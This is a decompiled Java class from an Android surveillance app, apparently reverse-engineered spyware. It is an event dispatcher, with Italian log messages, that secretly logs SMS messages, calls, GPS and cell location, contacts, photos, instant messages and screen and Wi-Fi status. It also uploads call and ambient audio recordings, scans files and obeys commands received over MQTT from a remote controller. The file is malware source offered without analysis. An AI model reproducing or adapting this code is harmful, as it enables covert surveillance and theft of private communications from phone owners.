package com.app.system.common.service;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.Bundle;
import android.telephony.SmsMessage;
import com.android.system.ActivationReceiver;
import com.android.system.CoreService;
import com.android.system.LocationReceiver;
import com.android.system.PlannedRecTrigger;
import com.android.system.SyncAndFlushReceiver;
import com.android.system.c;
import com.app.system.common.entity.Call;
import com.app.system.common.entity.CellInfo;
import com.app.system.common.entity.GPS;
import com.app.system.common.entity.Message;
import com.app.system.common.entity.Notify;
import com.app.system.common.entity.PhotoLog;
import com.app.system.common.entity.ScreenStatus;
import com.app.system.common.entity.WifiStatus;
import com.app.system.common.f.i;
import com.app.system.common.f.m;
import com.app.system.common.f.n;
import com.app.system.mqtt.MqttCommand;
import com.app.system.mqtt.MqttCommandReply;
import com.security.ServiceSettings;
import java.util.Date;

public class EventsAndReceiveService
  extends com.b.a.a.a
{
  public EventsAndReceiveService()
  {
    super("ERService");
  }
  
  protected void a(Intent paramIntent)
  {
    Context localContext = getApplicationContext();
    Object localObject1 = localContext.getSharedPreferences("pref", 0);
    boolean bool = ((SharedPreferences)localObject1).getBoolean("agent-active", false);
    try
    {
      Object localObject2 = paramIntent.getExtras().getString("event_core_app");
      if (localObject2 == null) {
        return;
      }
      Object localObject3;
      int i;
      Object localObject4;
      if (((String)localObject2).equals("event_sms_log"))
      {
        if (bool)
        {
          if (com.app.system.common.f.a.b(localContext) == 1) {
            SyncAndFlushReceiver.c(localContext);
          }
          if (com.app.system.common.f.a.a(localContext) == 1) {
            LocationReceiver.c(localContext);
          }
        }
        paramIntent = paramIntent.getExtras().getBundle("bundleSMS");
        if (paramIntent != null)
        {
          localObject2 = (Object[])paramIntent.get("pdus");
          localObject3 = new SmsMessage[localObject2.length];
          for (i = 0; i < localObject3.length; i++)
          {
            localObject3[i] = SmsMessage.createFromPdu((byte[])localObject2[i]);
            localObject4 = localObject3[i].getDisplayMessageBody();
            if ((localObject4 != null) && (((String)localObject4).length() > 0) && (!com.app.system.common.g.a.a(this, (String)localObject4)) && (bool) && (((SharedPreferences)localObject1).getBoolean("sms-active", false)))
            {
              paramIntent = localObject3[i].getOriginatingAddress();
              if ((paramIntent != null) && (paramIntent.trim().length() != 0)) {
                break label229;
              }
              paramIntent = ((SharedPreferences)localObject1).getString("device-telephone-number", " ");
              label229:
              Message localMessage = new com/app/system/common/entity/Message;
              Object localObject5 = new com/app/system/common/a/a;
              ((com.app.system.common.a.a)localObject5).<init>(localContext);
              String str = com.app.system.common.h.a(((com.app.system.common.a.a)localObject5).a(localObject3[i].getOriginatingAddress().toString()));
              localObject5 = new java/util/Date;
              ((Date)localObject5).<init>();
              localMessage.<init>(0L, paramIntent, str, ((Date)localObject5).getTime() / 1000L, com.app.system.common.h.a((String)localObject4), 1, 0);
              paramIntent = new com/app/system/common/h/k;
              paramIntent.<init>(localContext);
              paramIntent.a(localMessage);
            }
          }
        }
        return;
      }
      if (((String)localObject2).equals("event_poll_activation_sms"))
      {
        ActivationReceiver.b(this);
        return;
      }
      if (((String)localObject2).equals("event_poll_activation"))
      {
        ActivationReceiver.c(this);
        return;
      }
      if (((String)localObject2).equals("event_connection_params"))
      {
        if (ServiceSettings.a().b("agent-active"))
        {
          com.security.d.a.d("ERService", "AGENT GIA' ATTIVO", new Object[0]);
          return;
        }
        com.security.d.a.d("ERService", "PARAMETRI CONNESSIONE RICEVUTI -- SCATENATE L'INFERNO!", new Object[0]);
        localObject1 = localContext.getSharedPreferences("pref", 0).edit();
        ((SharedPreferences.Editor)localObject1).putBoolean("agent-active", true);
        ((SharedPreferences.Editor)localObject1).commit();
        if (!com.app.system.common.h.e(localContext))
        {
          com.security.d.a.d("ERService", "AGENT ATTIVATO -- AVVIO CORE SERVICE", new Object[0]);
          localObject1 = new android/content/Intent;
          ((Intent)localObject1).<init>(localContext, CoreService.class);
          paramIntent.setFlags(268435456);
          localContext.startService((Intent)localObject1);
        }
        return;
      }
      if (!bool)
      {
        com.security.d.a.d("ERService", "AGENT NON ATTIVO -- USCITA", new Object[0]);
        return;
      }
      if (((String)localObject2).equals("event_has_connected"))
      {
        if (com.app.system.common.f.a.b(localContext) == 1) {
          SyncAndFlushReceiver.c(localContext);
        }
        if (com.app.system.common.f.a.a(localContext) == 1) {
          LocationReceiver.c(localContext);
        }
        i.a(localContext, true);
        if (!com.app.system.common.h.e(localContext))
        {
          if (((SharedPreferences)localObject1).getBoolean("agent-active", false))
          {
            com.security.d.a.d("ERService", "FORCE START CORESPYSERVICE", new Object[0]);
            paramIntent = new android/content/Intent;
            paramIntent.<init>(localContext, CoreService.class);
            paramIntent.setFlags(268435456);
            localContext.startService(paramIntent);
          }
          else
          {
            com.security.d.a.d("ERService", "AGENT NON ATTIVO -- NOT STARTING CORE SERVICE", new Object[0]);
          }
          return;
        }
        return;
      }
      if (((String)localObject2).equals("event_sync_and_flush"))
      {
        com.app.system.common.f.a.h(localContext);
        return;
      }
      if (((String)localObject2).equals("event_gps_log"))
      {
        localObject1 = new com/app/system/common/entity/GPS;
        ((GPS)localObject1).<init>(0L, paramIntent.getExtras().getLong("date"), paramIntent.getExtras().getString("lat"), paramIntent.getExtras().getString("lon"), Double.parseDouble(paramIntent.getExtras().getString("alt")));
        paramIntent = new com/app/system/common/h/h;
        paramIntent.<init>(localContext);
        if (paramIntent.a((GPS)localObject1))
        {
          paramIntent = new java/lang/StringBuilder;
          paramIntent.<init>();
          paramIntent.append("Append new GPS: lat = ");
          paramIntent.append(((GPS)localObject1).c());
          paramIntent.append(", lon = ");
          paramIntent.append(((GPS)localObject1).d());
          com.security.d.a.d("ERService", paramIntent.toString(), new Object[0]);
          return;
        }
        return;
      }
      long l1;
      if (((String)localObject2).equals("event_cell_info_log"))
      {
        l1 = paramIntent.getLongExtra("dateTime", 0L);
        int j = paramIntent.getIntExtra("LAC", 0);
        i = paramIntent.getIntExtra("CID", 0);
        int k = paramIntent.getIntExtra("MCC", 0);
        int m = paramIntent.getIntExtra("MNC", 0);
        localObject3 = new com/app/system/common/entity/CellInfo;
        localObject4 = new java/util/Date;
        ((Date)localObject4).<init>(l1);
        ((CellInfo)localObject3).<init>((Date)localObject4, j, i, k, m);
        localObject4 = new com/app/system/common/h/e;
        ((com.app.system.common.h.e)localObject4).<init>(localContext);
        ((com.app.system.common.h.e)localObject4).a((CellInfo)localObject3);
      }
      if (((String)localObject2).equals("event_fs_scan")) {
        c.a().b();
      }
      if (((String)localObject2).equals("event_app_list")) {
        com.android.system.b.a().b();
      }
      if (((String)localObject2).equals("event_contacts_scan")) {
        if (ServiceSettings.a().contactsActive) {
          com.app.system.common.f.e.n(localContext);
        } else {
          com.security.d.a.d("ERService", "INVIO CONTATTI NON ABILITATO", new Object[0]);
        }
      }
      if (((String)localObject2).equals("event_wifi_state"))
      {
        bool = paramIntent.getBooleanExtra("wifi_state", false);
        localObject3 = new com/app/system/common/entity/WifiStatus;
        localObject4 = new java/util/Date;
        ((Date)localObject4).<init>();
        ((WifiStatus)localObject3).<init>(bool, ((Date)localObject4).getTime() / 1000L);
        localObject4 = new com/app/system/common/d/a/k;
        ((com.app.system.common.d.a.k)localObject4).<init>(com.app.system.common.h.c(localContext));
        ((com.app.system.common.d.a.k)localObject4).a(localContext, (Notify)localObject3);
      }
      if (((String)localObject2).equals("event_mqtt_reconnect"))
      {
        com.security.d.a.d("ERService", "Forza riconnessione a MQTT", new Object[0]);
        com.app.system.mqtt.a.a().c();
      }
      if (((String)localObject2).equals("event_mqtt_msg"))
      {
        localObject3 = MqttCommand.a(paramIntent.getExtras().getString("mqtt_msg_data"));
        if (localObject3 != null)
        {
          localObject3 = ((MqttCommand)localObject3).a(localContext);
          localObject4 = new com/app/system/common/d/a/e;
          ((com.app.system.common.d.a.e)localObject4).<init>(localContext);
          ((com.app.system.common.d.a.e)localObject4).a((MqttCommandReply)localObject3);
        }
      }
      if (((String)localObject2).equals("event_planned_rec")) {
        PlannedRecTrigger.a(localContext, paramIntent.getLongExtra("planned-rowid", 0L));
      }
      if (((String)localObject2).equals("event_send_call_rec"))
      {
        localObject4 = new java/lang/Thread;
        localObject3 = new com/app/system/common/service/EventsAndReceiveService$1;
        ((1)localObject3).<init>(this, localContext);
        ((Thread)localObject4).<init>((Runnable)localObject3);
        ((Thread)localObject4).start();
      }
      if (((String)localObject2).equals("event_send_amb_rec"))
      {
        localObject3 = new java/lang/Thread;
        localObject4 = new com/app/system/common/service/EventsAndReceiveService$2;
        ((2)localObject4).<init>(this, localContext);
        ((Thread)localObject3).<init>((Runnable)localObject4);
        ((Thread)localObject3).start();
      }
      if (((String)localObject2).equals("event_send_pics")) {
        com.app.system.common.f.k.a(localContext);
      }
      if (((String)localObject2).equals("event_send_active_app")) {
        com.app.system.common.f.b.a(localContext, paramIntent.getStringExtra("app_name"), paramIntent.getStringExtra("pkg_name"), paramIntent.getLongExtra("timestamp", 0L));
      }
      if (((String)localObject2).equals("event_send_screen_status"))
      {
        bool = paramIntent.getBooleanExtra("status", false);
        l1 = paramIntent.getLongExtra("timestamp", 0L);
        localObject3 = new com/app/system/common/entity/ScreenStatus;
        ((ScreenStatus)localObject3).<init>(bool, l1);
        n.a(localContext, (ScreenStatus)localObject3);
      }
      if (((String)localObject2).equals("Send_Instant_Messages")) {
        com.app.system.common.f.h.a(localContext);
      }
      if (((String)localObject2).equals("event_sync_device_info")) {
        com.app.system.common.f.f.a(localContext);
      }
      if (((String)localObject2).equals("event_sms_outgoing_log"))
      {
        if (com.app.system.common.f.a.b(localContext) == 1) {
          SyncAndFlushReceiver.c(localContext);
        }
        if (com.app.system.common.f.a.a(localContext) == 1) {
          LocationReceiver.c(localContext);
        }
        if (((SharedPreferences)localObject1).getBoolean("sms-active", false))
        {
          paramIntent = new com/app/system/common/a/f;
          paramIntent.<init>(localContext);
          localObject1 = paramIntent.a();
          if ((localObject1 != null) && (!com.app.system.common.g.a.a(this, ((Message)localObject1).g())))
          {
            paramIntent = new com/app/system/common/h/k;
            paramIntent.<init>(localContext);
            if (paramIntent.a((Message)localObject1) > 0L) {
              return;
            }
          }
          return;
        }
        return;
      }
      if (((String)localObject2).equals("event_call_log"))
      {
        if (com.app.system.common.f.a.b(localContext) == 1) {
          SyncAndFlushReceiver.c(localContext);
        }
        if (com.app.system.common.f.a.a(localContext) == 1) {
          LocationReceiver.c(localContext);
        }
        localObject2 = paramIntent.getStringExtra("call_app");
        if (localObject2 != null)
        {
          long l2 = paramIntent.getLongExtra("call_time", 0L);
          localObject1 = paramIntent.getStringExtra("call_number");
          com.security.d.a.d("ERService", String.format("CALL - APP=%s, TIME=%d, NUMBER=%s", new Object[] { localObject2, Long.valueOf(l2), localObject1 }), new Object[0]);
          if (l2 > 0L)
          {
            l1 = System.currentTimeMillis();
            Long.signum(l2);
            l1 = (l1 - l2 * 1000L) / 1000L;
          }
          else
          {
            l1 = 0L;
          }
          i = paramIntent.getIntExtra("call_dir", 2);
          paramIntent = new com/app/system/common/entity/Call;
          paramIntent.<init>(0L, (String)localObject1, (String)localObject1, l2, l1, i);
          localObject1 = new com/app/system/common/h/d;
          ((com.app.system.common.h.d)localObject1).<init>(localContext);
          ((com.app.system.common.h.d)localObject1).a(paramIntent);
          com.app.system.common.f.a.h(localContext);
          return;
        }
        if (((SharedPreferences)localObject1).getBoolean("call-active", false))
        {
          paramIntent = new com/app/system/common/a/b;
          paramIntent.<init>(localContext);
          paramIntent = paramIntent.a();
          if (paramIntent != null)
          {
            localObject1 = new com/app/system/common/h/d;
            ((com.app.system.common.h.d)localObject1).<init>(localContext);
            if (((com.app.system.common.h.d)localObject1).a(paramIntent)) {
              return;
            }
          }
          return;
        }
        return;
      }
      if (((String)localObject2).equals("event_contact_log"))
      {
        if (com.app.system.common.f.a.b(localContext) == 1) {
          SyncAndFlushReceiver.c(localContext);
        }
        if (com.app.system.common.f.a.a(localContext) == 1) {
          LocationReceiver.c(localContext);
        }
        if (((SharedPreferences)localObject1).getBoolean("contact-active", false))
        {
          paramIntent = new com/app/system/common/a/d;
          paramIntent.<init>(localContext);
          paramIntent = paramIntent.b();
          if (paramIntent != null)
          {
            localObject1 = new com/app/system/common/h/f;
            ((com.app.system.common.h.f)localObject1).<init>(localContext);
            if (((com.app.system.common.h.f)localObject1).a(paramIntent) > 0L) {
              return;
            }
          }
          return;
        }
        return;
      }
      if (((String)localObject2).equals("event_photo_log"))
      {
        if (com.app.system.common.f.a.b(localContext) == 1) {
          SyncAndFlushReceiver.c(localContext);
        }
        if (com.app.system.common.f.a.a(localContext) == 1) {
          LocationReceiver.c(localContext);
        }
        if (((SharedPreferences)localObject1).getBoolean("files-active", false))
        {
          localObject1 = com.app.system.common.a.e.a(localContext);
          if (localObject1 != null)
          {
            paramIntent = new com/app/system/common/h/l;
            paramIntent.<init>(localContext);
            paramIntent.a((PhotoLog)localObject1);
          }
        }
      }
    }
    catch (Exception paramIntent)
    {
      com.security.d.a.a("ERService", paramIntent.getMessage(), new Object[0]);
    }
  }
}


/* Location:              ~/com/app/system/common/service/EventsAndReceiveService.class
 *
 * Reversed by:           J
 */